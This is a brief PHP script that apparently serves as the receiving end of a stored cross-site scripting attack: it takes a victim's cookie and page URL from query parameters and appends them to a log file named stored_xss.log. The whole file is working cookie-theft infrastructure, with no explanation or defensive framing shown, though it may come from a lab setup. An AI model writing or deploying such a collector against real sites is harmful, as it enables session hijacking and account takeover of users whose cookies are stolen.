<?php
$logfile = '../logs/stored_xss.log';
$c = $_GET['c'] ?? '';
$url = $_GET['url'] ?? '';
if($c){
    file_put_contents($logfile, date('Y-m-d H:i:s')." | URL: $url | COOKIE: $c\n", FILE_APPEND);
    echo "OK";
}else{
    http_response_code(400);
}
?>